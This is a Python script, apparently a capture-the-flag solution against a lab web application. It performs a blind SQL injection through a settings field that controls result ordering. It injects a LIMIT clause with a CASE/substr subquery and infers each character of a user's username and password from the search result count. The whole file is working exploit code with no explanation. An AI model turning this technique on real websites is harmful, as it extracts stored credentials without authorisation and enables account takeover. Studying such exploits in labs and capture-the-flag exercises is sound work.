import requests
import bs4 as BeautifulSoup
import regex

BASE = "https://inst-f2zdvracbs.web.vuln.si"
s = requests.Session()

s.post(f"{BASE}/login", data={"username": "test", "password": "this_is_test_password"})
SRC = f"{BASE}/search"
SET = f"{BASE}/settings"

number = int(s.get(SRC).text.split(' ')[7])
def injection(inj):
    s.post(SET, data={"order": inj})
    txt = s.get(SRC).text
    # print(txt)
    txt = txt[txt.index("<li>")+4: txt.rindex("</li>")]
    return txt.split("</li><li>")

# charset = "abcdefghijklmnopqrstuvwxyz0123456789_+"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_+"
def exfil_column(field):
    toret = ""
    for i in range(1, 100):
        for c in charset:
            inj = f"LIMIT (SELECT CASE WHEN substr((SELECT {field} FROM users WHERE is_flagworthy=1),{i},1)='{c}' THEN 1 ELSE 999 END)"
            s.post(SET, data={"order": inj})
            r = s.get(f"{BASE}/search?query=")
            count = int(r.text.split("Found friends:")[1].split("<")[0].strip())
            if count == 1:
                toret += c
                print(f"{c}", end="", flush=True)
                break
            if(c=='+'):
                print()
                return toret

    print()
    return toret


exfil_column("username")
exfil_column("password")
